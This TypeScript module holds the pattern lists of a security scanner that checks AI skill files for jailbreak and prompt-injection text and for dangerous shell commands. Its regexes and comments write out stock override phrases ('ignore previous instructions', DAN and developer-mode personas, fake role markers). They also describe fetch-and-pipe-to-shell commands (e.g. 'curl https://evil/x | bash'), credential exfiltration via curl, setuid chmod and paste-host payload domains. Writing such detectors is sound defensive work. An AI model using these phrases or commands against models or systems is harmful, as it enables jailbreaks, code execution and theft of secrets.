/**
 * SMI-5402: Edge scanner pattern arrays
 * @module scripts/indexer/_shared/security-scanner-edge.patterns (Node port)
 *
 * The five high-risk pattern arrays used by the edge security scanner, split
 * out of security-scanner-edge.ts to stay under the 500-line limit (SMI-5402).
 * Byte-identical body across both _shared twins (parity test enforces); only
 * the @module header line above differs.
 *
 * SMI-5879 (design §2): JAILBREAK_PATTERNS grew from 10 to 18 entries and
 * PROMPT_INJECTION_PATTERNS from 6 to 9, porting the pinned core allowlist
 * (@skillsmith/core patterns.jailbreak.ts) that closes the RC-1 multiline-scan
 * false-negative gap. Ported verbatim from core except: entry #3 below (edge's
 * own developer-mode activation-verb gate is KEPT, not replaced by core's
 * looser bare `/developer\s+mode/i` — core's own comment forbids porting that
 * one to edge); and entry #7 (JB_BYPASS_RESTRICTIONS) is WIDENED to match
 * core's current determiner-widened form. Explicitly excluded (see the
 * SMI-5879 design doc §2.3 for the follow-up issues): JB_ACT_NO_ETHICS,
 * JB_HYPOTHETICAL_SCENARIO, JB_SPLIT_IGNORE/DISREGARD/BYPASS (SMI-A follow-up,
 * each gated on its own corpus FP measurement), and the two ChatML
 * compensators AD_AN3A/AD_AN3B (SMI-B follow-up).
 */

// ============================================================================
// SMI-5879: shared source fragments for the new jailbreak state-assertion /
// mode-frame patterns — ported verbatim from core patterns.jailbreak.ts so
// this array cannot drift from core's own composed forms.
// ============================================================================

/** Restriction-removal / capability-grant lexicon — the "concrete adversarial
 * evidence" that an AMBIGUOUS jailbreak-domain noun (developer mode) must
 * co-occur with. Never used standalone. */
const CAPABILITY_SRC =
  '(?:un(?:restricted|filtered|censored)' +
  '|no\\s+(?:limits?|restrictions?|rules?|filters?|guardrails?|ethics|boundaries)' +
  '|without\\s+(?:limits?|restrictions?|censorship|filters?|rules?)' +
  '|(?:restrictions?|filters?|limits?|guardrails?|safety)\\s*[:=]\\s*off' +
  '|override' +
  '|ignore\\s+(?:all\\s+)?(?:safety|restrictions?|rules?|guidelines?|filters?)' +
  '|bypass\\s+(?:your\\s+|all\\s+|the\\s+|any\\s+)?(?:filters?|restrictions?|safety|guard(?:rail)?s?|rules?)' +
  '|disable\\s+(?:all\\s+)?(?:safety|filters?|restrictions?|guardrails?)' +
  '|do\\s+anything|say\\s+anything|answer\\s+(?:anything|freely)|respond\\s+freely' +
  '|free(?:d)?\\s+from\\s+(?:all\\s+)?(?:restrictions?|limits?|rules?)' +
  '|broken\\s+free|no\\s+longer\\s+(?:bound|restricted|limited))'

/** Activation-STATE predicate. Bare `on`/`off` only reachable after `:`/`=`
 * (so "the jailbreak on iOS 14 was patched" cannot match). */
const STATE_SRC =
  '(?:[:=]\\s*(?:on|off|true|yes|enabled|activated|active|unlocked|engaged)' +
  '|\\s+(?:enabled|activated|unlocked|engaged|initiali[sz]ed))'

/** Activation/adoption frame — a verb PRECEDING the noun, aimed at the model. */
const ADOPT_SRC =
  '(?:you\\s+are\\s+(?:now\\s+)?(?:in\\s+)?|(?:act|behave|respond|reply|answer)\\s+as\\s+(?:if\\s+you\\s+(?:are|were)\\s+)?' +
  '|pretend\\s+(?:to\\s+be|you\\s+are)\\s+|roleplay\\s+as\\s+|enter\\s+|activate\\s+|enable\\s+|engage\\s+' +
  '|turn\\s+on\\s+|switch\\s+(?:in)?to\\s+|unlock\\s+|i\\s+want\\s+you\\s+to\\s+(?:be|act\\s+as)\\s+)'

/** Unambiguous jailbreak-domain nouns — no benign product meaning. */
const NOUN_STRONG_SRC =
  '(?:jailbreak|jailbroken|dan|god|unrestricted|unfiltered|uncensored|no[\\s-]?restrictions?)'
/** AMBIGUOUS noun (Chrome / VS Code / Docker / device settings) — always needs a co-signal. */
const NOUN_WEAK_SRC = 'dev(?:eloper)?[\\s-]+mode'

// SMI-5879 J-N1: activation OR adoption frame + an UNAMBIGUOUS jailbreak-mode
// noun. Accepts a `persona(lity)?` suffix ("Activate DAN personality").
const JB_JN1_MODE_FRAME = new RegExp(
  `\\b${ADOPT_SRC}(?:a\\s+|an\\s+|the\\s+)?${NOUN_STRONG_SRC}[\\s-]*(?:mode|persona(?:lity)?)\\b`,
  'i'
)

// SMI-5879 J-N2: `developer mode` is AMBIGUOUS (Chrome/VS Code/Docker), so it
// accepts ONLY an assistant-directed frame — activation verbs (enable/enter/
// activate/switch to) are deliberately excluded, which is what keeps "Enable
// developer mode in Chrome" clean.
const JB_JN2_DEVELOPER_MODE_FRAME =
  /\b(?:you\s+are\s+(?:now\s+)?(?:in\s+)?(?:a\s+|the\s+)?|(?:act|behave|respond|reply|answer)\s+as\s+(?:if\s+you\s+(?:are|were)\s+)?(?:in\s+)?(?:a\s+|the\s+)?|pretend\s+(?:to\s+be|you\s+are)\s+(?:in\s+)?(?:a\s+|the\s+)?|roleplay\s+as\s+(?:a\s+|the\s+)?)developer\s+mode\b/i

// SMI-5879 J-N3: named jailbreak persona. Case-SENSITIVE on the persona so
// the given name "Dan" cannot match.
const JB_JN3_PERSONA_FRAME =
  /(?:[Yy]ou\s+are\s+(?:now\s+)?(?:a\s+|an\s+|the\s+)?|[Aa]ct\s+as\s+(?:a\s+|an\s+|the\s+)?|[Pp]retend\s+(?:to\s+be|you\s+are)\s+(?:a\s+|an\s+|the\s+)?|[Rr]oleplay\s+as\s+(?:a\s+|an\s+|the\s+)?|[Ff]rom\s+now\s+on\s+you\s+are\s+(?:a\s+|an\s+|the\s+)?)(?:DAN|AIM|STAN|DUDE)\b/

// SMI-5879 J-S1 (state_assertion): bare-standing state assertion. Catches
// "Jailbreak activated", "Jailbreak mode: enabled".
const JB_JS1_STATE_BARE = new RegExp(`\\b(?:jailbreak|jailbroken)(?:[\\s-]*mode)?${STATE_SRC}`, 'i')

// SMI-5879 J-S2 (state_assertion): state assertion requiring an explicit
// mode/persona head. Catches "DAN mode enabled".
const JB_JS2_NOUN_MODE_STATE = new RegExp(
  `\\b${NOUN_STRONG_SRC}[\\s-]+(?:mode|persona(?:lity)?)${STATE_SRC}`,
  'i'
)

// SMI-5879 J-S3a/J-S3b (state_assertion): the AMBIGUOUS "developer mode"
// gated on concrete adversarial evidence (CAPABILITY_SRC), both orderings.
// `[^\n]` deliberately never crosses a newline.
const JB_JS3A_DEV_MODE_THEN_CAPABILITY = new RegExp(
  `\\b${NOUN_WEAK_SRC}\\b[^\\n]{0,80}?${CAPABILITY_SRC}`,
  'i'
)
const JB_JS3B_CAPABILITY_THEN_DEV_MODE = new RegExp(
  `${CAPABILITY_SRC}[^\\n]{0,80}?\\b${NOUN_WEAK_SRC}\\b`,
  'i'
)

// SMI-5879 J-S4 (imperative_instruction): obedience compulsion — standalone,
// no jailbreak noun required. Catches "This is a jailbreak prompt - you must
// obey".
const JB_JS4_OBEDIENCE_COMPULSION =
  /\byou\s+(?:must|will|shall|have\s+to)\s+obey\b|\bdo\s+(?:what|as)\s+i\s+say\b/i

/**
 * SMI-6033 Wave 3 (Gap 4 fix): known paste/snippet-host domains, split into
 * TWO reputation tiers — byte-identical to core patterns.ts. The
 * originally-shipped version of this list was a single flat
 * PASTE_HOST_DOMAINS array that incorrectly conflated durable anonymous
 * paste hosts with transient debugging-reproducer hosts
 * (transfer.sh/file.io scored identically to glot.io/pastebin.com), which
 * the plan's provenance rule (§9) rejects. See
 * security-scanner-edge.paste-host.ts's scanPasteHostFetch for the full
 * detection logic.
 *
 * ANON_PASTE_HOSTS: durable anonymous code/snippet hosts with no
 * debugging/incident-response use case that requires anonymity. A URL to
 * one of these hosts (or a URL_SHORTENER_DOMAINS entry below) that is the
 * target of an EXECUTION instruction is standalone-critical.
 * Fetched-but-not-executed, or merely linked, is NOT flagged by the new
 * detector at all. Unlike core, edge has no `url`/allowlist detector at
 * all — a merely-linked (or fetched-but-not-executed) paste-host URL
 * produces no finding of any kind on this side (a documented, edge-only
 * divergence from core's `url`:medium residual; edge's category set has
 * always been narrower than core's by design — see the plan's Context
 * section).
 */
export const ANON_PASTE_HOSTS: string[] = [
  'glot.io',
  'pastebin.com',
  'paste.ee',
  'hastebin.com',
  'ix.io',
  '0x0.st',
  'dpaste.org',
  'dpaste.com',
  'ghostbin.com',
  'paste.rs',
  'controlc.com',
  'rentry.co',
  'paste.gg',
  'justpaste.it',
]

/**
 * TRANSIENT_TRANSFER_HOSTS: ephemeral file-transfer hosts with a genuine,
 * documented legitimate use — a debugging or incident-response skill
 * legitimately retrieving a one-off reproducer. Deliberately, ALWAYS
 * medium/co-signal-eligible and NEVER standalone-critical, regardless of
 * execution evidence: `curl file.io/x | bash` alone staying sub-threshold
 * is a deliberate, documented residual, not a gap.
 */
export const TRANSIENT_TRANSFER_HOSTS: string[] = [
  'transfer.sh',
  'file.io',
  'tmpfiles.org',
  'temp.sh',
]

/**
 * Known URL-shorteners join ANON_PASTE_HOSTS's critical rule, but ONLY when
 * execution-correlated — a shortened URL piped to a shell has no legitimate
 * install shape (unlike a bare shortened link, which is common and benign).
 */
export const URL_SHORTENER_DOMAINS: string[] = ['bit.ly', 'tinyurl.com', 't.co', 'is.gd']

/**
 * SMI-6033 Wave 4 (Gap 6): byte-identical to core patterns.ts
 * DEFAULT_ALLOWED_DOMAINS. Edge has never had a general URL-allowlist
 * detector of its own (no `url` finding type — edge's category set is
 * narrower than core's by design, see this file's own ANON_PASTE_HOSTS
 * comment), but the new decoy_misdirection detector
 * (security-scanner-edge.decoy.ts) needs this SPECIFIC list for its own
 * exclusion gate — a domain mismatch against the claimed vendor is not a
 * decoy if the fetch target is generally trusted regardless of vendor.
 */
export const DEFAULT_ALLOWED_DOMAINS: string[] = [
  'github.com',
  'githubusercontent.com',
  'raw.githubusercontent.com',
  'npmjs.com',
  'npmjs.org',
  'docs.anthropic.com',
  'anthropic.com',
  'claude.ai',
  'docs.github.com',
  'developer.mozilla.org',
  'nodejs.org',
  'typescriptlang.org',
]

/**
 * Jailbreak attempt patterns - attempts to manipulate AI behavior
 *
 * SMI-4960: `/developer\s+mode/i` required an activation verb (enable / enter /
 * activate / switch to). Bare "developer mode" is browser/VS-Code documentation
 * vocabulary (xixu-me/develop-userscripts FP); only an explicit activation
 * instruction is a jailbreak signal. Do NOT replace this with core's looser
 * bare `/developer\s+mode/i` (core's own comment forbids porting it to edge).
 *
 * SMI-5879 (design §2.1): grew from 10 to 18 entries — the pinned core
 * allowlist. See this module's header comment for the full mapping.
 */
export const JAILBREAK_PATTERNS: RegExp[] = [
  /ignore\s+(all\s+)?(previous|prior|above)\s+(instructions?|prompts?|rules?)/i,
  /disregard\s+(all\s+)?(previous|prior|your)\s+(instructions?|programming)/i,
  /(enable|enter|activate|switch\s+to)\s+developer\s+mode/i,
  /\bDAN\b/,
  /do\s+anything\s+now/i,
  /jailbreak/i,
  // SMI-5879: widened to core's current form (determiner + guard(rail)? noun).
  /bypass\s+(?:all\s+|your\s+|the\s+|any\s+)?(?:restrictions?|filters?|safety|guard(?:rail)?s?)/i,
  /pretend\s+(you\s+)?(are|have)\s+no\s+(restrictions?|limits?)/i,
  /you\s+are\s+now\s+(free|unrestricted|unfiltered)/i,
  /ignore\s+your\s+(safety|ethical)\s+(guidelines?|rules?)/i,
  JB_JN1_MODE_FRAME,
  JB_JN2_DEVELOPER_MODE_FRAME,
  JB_JN3_PERSONA_FRAME,
  JB_JS1_STATE_BARE,
  JB_JS2_NOUN_MODE_STATE,
  JB_JS3A_DEV_MODE_THEN_CAPABILITY,
  JB_JS3B_CAPABILITY_THEN_DEV_MODE,
  JB_JS4_OBEDIENCE_COMPULSION,
]

/**
 * Suspicious patterns - code execution, shell commands
 */
export const SUSPICIOUS_PATTERNS: RegExp[] = [
  /eval\s*\(/i,
  /exec\s*\(/i,
  /child_process/i,
  /\$\(\s*[`'"]/i, // Command substitution
  /base64\s*\.\s*decode/i,
  /from\s+base64\s+import/i,
  /subprocess\s*\.\s*(run|call|Popen)/i,
  /os\s*\.\s*(system|popen|exec)/i,
  /\brm\s+-rf\b/i,
  /curl\s+.*\|\s*(bash|sh)/i,
  /wget\s+.*\|\s*(bash|sh)/i,
]

/**
 * Data exfiltration patterns - suspicious data transfer
 *
 * SMI-4960: tightened to core patterns.ts DATA_EXFILTRATION_PATTERNS (SMI-4396
 * Wave 2 forms). The prior `/upload\s+.*(to|the)\s+(server|cloud|remote)/i`
 * matched "upload to Cloudinary" (Cloud prefix substring); the bounded
 * `[\w\s]{0,30}?` + `\bcloud\b` word-boundary excludes
 * Cloudinary/cloudfront/cloudflare/iCloud. The `(send|transmit|leak|dump|steal|
 * extract) … (passwords|credentials|secrets)` form preserves imperative
 * exfiltration coverage without re-introducing prose FPs.
 */
export const DATA_EXFILTRATION_PATTERNS: RegExp[] = [
  /navigator\.sendBeacon/i,
  /webhook\s*[=:]/i,
  /exfil/i,
  /send\s+.*(to|the)\s+(external|remote)/i,
  /upload\s+[\w\s]{0,30}?\s*(?:to|the)\s+(?:server|\bcloud\b|remote)/i,
  /upload\s+[\w\s]{0,50}?\s*(?:private\s+)?(?:key|secret|credential|token)s?\b/i,
  /post\s+data\s+to/i,
  /to\s+external\s+(api|server|endpoint)/i,
  /(?:send|transmit|leak|dump|steal|extract)\s+[\w\s']{0,40}(?:passwords?|credentials?|secrets?)\b/i,
  // SMI-5429: ported verbatim from core DATA_EXFILTRATION_PATTERNS — an outbound
  // curl/wget carrying a credential env-var INSIDE the fetched URL's query string
  // (GET) or in a -d/--data/-F/--form request body (POST). A header-borne auth call
  // (curl -H "Authorization: Bearer $TOKEN") matches neither (no `?`-query, the var
  // is outside any -d/-F arg). Bounded lazy-then-anchored quantifiers → ReDoS-safe.
  /\b(?:curl|wget)\b[^\n]{0,150}?https?:\/\/[^\n\s?]{0,200}\?[^\n\s]{0,200}?\$\{?[A-Za-z0-9_]{0,40}(?:KEY|TOKEN|SECRET|PASS|CRED)/i,
  /\b(?:curl|wget)\b[^\n]{0,200}?(?:-d|--data(?:-raw|-binary|-urlencode)?|-F|--form)\b[^\n]{0,100}?\$\{?[A-Za-z0-9_]{0,40}(?:KEY|TOKEN|SECRET|PASS|CRED)/i,
]

/**
 * Privilege escalation patterns
 *
 * SMI-4960: tightened to core patterns.ts PRIVILEGE_ESCALATION_PATTERNS (SMI-4396
 * Wave 2 forms). The prior bare `/escalat(e|ion)/i` matched documentation prose
 * in security-research / prompt-injection-scanner skills that enumerate
 * "privilege escalation" as a technique they DETECT. Replaced with contextual
 * variants (exploit-escalate, attack/vector noun phrases, to-root/to-admin
 * targets) that preserve real coverage.
 */
export const PRIVILEGE_ESCALATION_PATTERNS: RegExp[] = [
  /sudo\s+.*(-S|--stdin)/i,
  /echo\s+.*\|\s*sudo/i,
  /sudo\s+-S/i,
  // SMI-5424 PR2: standalone-critical chmod — genuine privilege threats. Owner-perm
  // chmod (755/644/600/700…) is NOT here (it false-fired on benign `chmod 755 ./bin/cli`);
  // it is now a COMPOUND signal via scanChmodFetchCompound, preserving the
  // curl|bash+chmod co-signal (escalateCodeExecution needs high/crit).
  /\bchmod\s+[0-7]?[0-7][0-7][2367]\b/i, // world-writable (others-write bit set: …2/3/6/7)
  /\bchmod\s+0?[2-7][0-7]{3}\b/i, // setuid/setgid octal (incl. leading-zero 04755/02755 + 3xxx/5xxx)
  /\bchmod\s+[ugoa]*\+s\b/i, // setuid/setgid symbolic (u+s / g+s / +s)
  // SMI-5428: world/others-writable symbolic chmod (o+w / a+w / go+w). The
  // (?=[ugoa]*[oa]) lookahead requires o/a in the target set and [rwxX]*w a `w` perm,
  // so owner/group-only writes (u+w, g+w) and non-write perms (u+x, a+x, o+r) do not match.
  /\bchmod\s+(?=[ugoa]*[oa])[ugoa]*\+[rwxX]*w/i, // world/others-writable symbolic (o+w / a+w / go+w)
  /\bchown\s+root/i,
  /\bchgrp\s+root/i,
  /visudo/i,
  /\/etc\/sudoers/i,
  /NOPASSWD/i,
  /setuid/i,
  /setgid/i,
  /capability\s+cap_/i,
  /privilege[_\s-]+escalat(?:e|ion)/i,
  /escalat(?:e|ion)\s+(?:attack|vector|(?:to|as)\s+(?:root|admin|superuser))/i,
  /exploit\s+[\w\s]{0,30}?\s*escalat(?:e|ion)/i,
  /privilege[ds]?\s+(elevat|escal)/i,
  /run\s+.*as\s+root/i,
  /(run|execute)\s+as\s+(root|admin)/i,
  /admin(istrator)?\s+access/i,
  /root\s+(access|user)/i,
  /as\s+root\s+user/i,
  /su\s+-\s+root/i,
  /become\s+root/i,
]

// ============================================================================
// SMI-5879: shared source fragments for the new role/chat-turn patterns
// (AD_AN1/AD_AN2) — ported verbatim from core patterns.jailbreak.ts. The
// ChatML fragments (CHAT_TOKEN_SRC/CHAT_BODY_SRC) are NOT ported — the two
// ChatML compensator patterns (AD_AN3A/AD_AN3B) are excluded (SMI-B follow-up).
// ============================================================================

const ROLE_MARKER_SRC = '(?:system|assistant|human|user)'
const LINE_DECOR_SRC = '(?:#{1,6}[ \\t]*|[-*>][ \\t]*|\\*{2})?'
/** Body text that instructs the model — the concrete co-occurring evidence,
 * mirroring CODE_EXECUTION_PATTERNS' "must name a real remote target"
 * discipline. */
const INSTRUCTION_BODY_SRC =
  '(?:you\\s+(?:are|must|should|will|can|need)|ignore|disregard|forget|override|bypass' +
  '|do\\s+not|never|always|from\\s+now\\s+on|new\\s+instructions?' +
  '|your\\s+(?:new\\s+)?(?:task|role|instructions?|goal))'

// A-N1 (pass 2, per-line): role marker at LINE START + an instructing body on
// the same line.
const AD_AN1_ROLE_BODY_SAME_LINE = new RegExp(
  `^[ \\t]{0,8}${LINE_DECOR_SRC}${ROLE_MARKER_SRC}[ \\t]*:[ \\t]{0,4}${INSTRUCTION_BODY_SRC}\\b`,
  'i'
)

// A-N2 (pass 1, full content — source contains \n): role marker alone on its
// line with the instructing body on the NEXT line.
const AD_AN2_ROLE_BODY_NEXT_LINE = new RegExp(
  `(?:^|\\n)[ \\t]{0,8}(?:#{1,6}[ \\t]*|[-*>][ \\t]*|-{3,}[ \\t]*)?${ROLE_MARKER_SRC}[ \\t]*:[ \\t]*\\n[ \\t]{0,8}${INSTRUCTION_BODY_SRC}\\b`,
  'i'
)

/**
 * SMI-5359 Wave 4.2c / SMI-6033 Wave 1: Remote-fetch-to-interpreter
 * ("code_execution") patterns. Previously re-declared inline in
 * security-scanner-edge.exec.ts instead of living here (this module's single
 * source of truth for every other shared pattern array) — moved here so a
 * future edit can't silently apply to only one of the two copies.
 *
 * Every pattern requires BOTH a fetch verb (curl/wget/irm/iwr/Invoke-WebRequest/
 * Net.WebClient) AND an execution sink (| sh|python|node…, <(...), eval $(...),
 * iex, -EncodedCommand). A bare package install (npm/pip/brew/cargo/apt) matches
 * none. Bounded quantifiers exclude the pipe / newline — no catastrophic backtracking.
 *
 * SMI-5359 Wave 4.2c retune (read-only prod sim FP): the curl/wget patterns also
 * require a CONCRETE remote target (http(s):// or a host.tld domain), so a
 * code-review/security-review skill documenting the generic pattern in prose
 * ("curl … | sh", placeholder, no target) no longer matches, while a real
 * "curl https://evil/x | bash" still does.
 */
export const CODE_EXECUTION_PATTERNS: RegExp[] = [
  // curl|wget <target> | [sudo] <interpreter>
  /(?:curl|wget)\b[^\n|]{0,150}?(?:https?:\/\/|\d{1,3}(?:\.\d{1,3}){3}|[\w-]{2,63}\.[a-z]{2,24})[^\n|]{0,150}?\|\s*(?:sudo\s+(?:-[A-Za-z]+\s+)?)?(?:(?:ba|z|da)?sh|python[23]?|node|ruby|perl|php|fish|bun|deno)\b/i,
  // process substitution: bash/sh/zsh/source/. <(curl|wget <target> ...)
  /(?:^|[\s;&])(?:source|\.|ba?sh|zsh|exec)\s+<\(\s*(?:curl|wget)\b[^\n)]{0,150}?(?:https?:\/\/|\d{1,3}(?:\.\d{1,3}){3}|[\w-]{2,63}\.[a-z]{2,24})/i,
  // command substitution into eval or `sh -c` with a remote target
  /(?:\beval\b|(?:ba|z)?sh\s+-c)\s+["']?[$`]\(?\s*(?:curl|wget)\b[^\n)]{0,150}?(?:https?:\/\/|\d{1,3}(?:\.\d{1,3}){3}|[\w-]{2,63}\.[a-z]{2,24})/i,
  // PowerShell download-and-execute
  /\b(?:iex|invoke-expression)\b[^\n]{0,100}?(?:\birm\b|\biwr\b|invoke-webrequest|invoke-restmethod|downloadstring|net\.webclient)/i,
  // PowerShell encoded command
  /\bpowershell\b[^\n]{0,60}?\s-e(?:nc|ncodedcommand)?\b\s*[A-Za-z0-9+/=]{16,}/i,
  // decode-then-exec: base64 -d ... | <interpreter>  (SMI-5359 retro NIT: da sink + interpreters)
  /\bbase64\s+(?:-d|--decode|-D)\b[^\n|]{0,60}?\|\s*(?:(?:ba|z|da)?sh|python[23]?|node|ruby|perl|php|fish|bun|deno)\b/i,
  // SMI-5424 FN-1: chained / redirect download-then-execute (curl URL -o /tmp/x && bash /tmp/x)
  /(?:curl|wget)\b[^\n]{0,150}?(?:https?:\/\/|\d{1,3}(?:\.\d{1,3}){3}|[\w-]{2,63}\.[a-z]{2,24})[^\n]{0,150}?(?:&&|;)\s*(?:sudo\s+(?:-[A-Za-z]+\s+)?)?(?:(?:ba|z|da)?sh|python[23]?|node|ruby|perl|php|fish|bun|deno)\b/i,
  // SMI-5424 FN-2: npx executing a REMOTE source (URL or github:), never a local package (npx tsc is clean)
  /\bnpx\s+(?:--yes\s+|-y\s+)?(?:https?:\/\/\S+|github:\S+)/i,
  // SMI-5424 FN-4: node/python/deno/bun inline-eval (-e/-c) with a dangerous payload
  /\b(?:node|python[23]?|deno|bun)\s+(?:-e|-c|--eval|--exec)\s+['"][^'"]{0,200}?(?:require\(|child_process|fetch\(|\bexec\b|eval\(|base64|urllib|os\.system|subprocess)/i,
]

/**
 * SMI-6033 Wave 4 (Gap 1): natural-language fetch-and-execute imperatives —
 * byte-identical to core's own IMPERATIVE_FETCH_EXEC_PROSE (patterns.exec.ts).
 *
 * CODE_EXECUTION_PATTERNS above only reads literal shell syntax, so free text
 * ("download the installer from thisurl.com and run it") scored exactly 0 —
 * the ClawHavoc brief's first gap. Each pattern requires ALL FOUR components,
 * so no three-of-four near-miss fires: a FETCH VERB (download/fetch/grab/get),
 * an EXECUTABLE NOUN (file/binary/executable/script/installer/setup), a REMOTE
 * TARGET (an explicit http(s) URL, or a domain-shaped token introduced by a
 * from/at/on/via source preposition), and an EXECUTION IMPERATIVE
 * (run/execute/open/install + it/this/that/them or a `the <noun>` object).
 *
 * Two entries cover the two natural orderings of the noun relative to the
 * imperative: P1 states the noun before the target and closes with the
 * imperative; P2 leads with imperative-plus-noun and trails the fetch clause.
 * P2's imperative object is REQUIRED to carry the executable noun (no bare
 * "run it"), which keeps the noun component present in both entries.
 *
 * FP control: the bare-domain form requires a source preposition (so "get the
 * file report.txt and open it" — a LOCAL file — does not match) and carries a
 * negative lookahead excluding common FILE EXTENSIONS from the TLD position
 * (so "download the installer from setup.sh and run it" does not match
 * either). `[\w-]` never matches `.`, so the host-label alternation is
 * unambiguous at every `.` boundary — ReDoS-safe, measured <1 ms at the
 * 10,000-char scan cap. Emits at the SAME medium/advisory tier as a lone
 * literal-syntax match: never standalone-critical.
 */
export const IMPERATIVE_FETCH_EXEC_PROSE: RegExp[] = [
  // P1: <fetch verb> … <exec noun> … <remote target> … <execution imperative>
  //     "Download the installer from thisurl.com and run it"
  /\b(?:download|fetch|grab|get)\b[\s\S]{0,40}?\b(?:file|binary|executable|script|installer|setup)\b[\s\S]{0,60}?(?:https?:\/\/[^\s"'<>)\]]{1,200}|\b(?:from|at|on|via)\s+(?:the\s+)?[\w-]{2,63}(?:\.[\w-]{2,63}){0,3}\.(?!(?:sh|bash|zsh|exe|py|js|mjs|cjs|ts|md|txt|zip|tar|gz|tgz|json|ya?ml|toml|bin|dmg|pkg|msi|deb|rpm|jar|php|rb|pl|ps1|bat|cmd|app)\b)[a-z]{2,24}\b)[\s\S]{0,120}?\b(?:run|execute|open|install)\s+(?:it|this|that|them|(?:the|this|that|your)\s+(?:file|binary|executable|script|installer|setup))\b/i,
  // P2: <execution imperative + exec noun> … <fetch verb> … <remote target>
  //     "Run the installer you downloaded from thisurl.com"
  /\b(?:run|execute|open|install)\s+(?:the|this|that|your)\s+(?:file|binary|executable|script|installer|setup)\b[\s\S]{0,80}?\b(?:download|fetch|grab|get)(?:ed|s|ing)?\b[\s\S]{0,60}?(?:https?:\/\/[^\s"'<>)\]]{1,200}|\b(?:from|at|on|via)\s+(?:the\s+)?[\w-]{2,63}(?:\.[\w-]{2,63}){0,3}\.(?!(?:sh|bash|zsh|exe|py|js|mjs|cjs|ts|md|txt|zip|tar|gz|tgz|json|ya?ml|toml|bin|dmg|pkg|msi|deb|rpm|jar|php|rb|pl|ps1|bat|cmd|app)\b)[a-z]{2,24}\b)/i,
]

/**
 * Prompt injection patterns - AI-specific attacks
 *
 * SMI-5879 (design §2.2): grew from 6 to 9 entries — the pinned core
 * AI_DEFENCE_PATTERNS subset (mapped to edge's `prompt_injection` type). The
 * original single HTML-comment pattern is SPLIT into a verb half (kept
 * directive) and a noun half (demoted to mention) — union is provably
 * identical to the original. See this module's header comment for the full
 * mapping and the two excluded ChatML compensators (SMI-B follow-up).
 */
export const PROMPT_INJECTION_PATTERNS: RegExp[] = [
  // Role injection: a bare role marker with NO body is payload-free. Coverage
  // of a role-turn WITH a directive body is retained by AN1 (same line) and
  // AN2 (marker alone on its line, body on the next).
  /(?:^|\s)(?:system|assistant|user)\s*:\s*(?:\n|$)/i,
  // Hidden instruction brackets
  /\[\[\s*[^\]]{1,200}\s*\]\]/,
  // SMI-5879: split from the original single HTML-comment-injection pattern
  // into a verb half (kept directive) and a noun half (demoted to mention).
  /<!--[\s\S]{0,100}?(?:ignore|override|bypass)[\s\S]{0,100}?-->/i,
  /<!--[\s\S]{0,100}?(?:system|instruction)[\s\S]{0,100}?-->/i,
  // Prompt structure manipulation
  /<\/?(?:system|prompt|instruction|context|message)(?:\s[^>]*)?>/i,
  // Delimiter injection
  /(?:^|\n)(?:---|\*{3}|#{3,})\s*(?:system|prompt|instruction|override)/i,
  // JSON structure injection
  /["']\s*(?:role|system|instruction)\s*["']\s*:\s*["'](?:system|assistant|user|ignore|override|bypass)/i,
  AD_AN1_ROLE_BODY_SAME_LINE,
  AD_AN2_ROLE_BODY_NEXT_LINE,
]
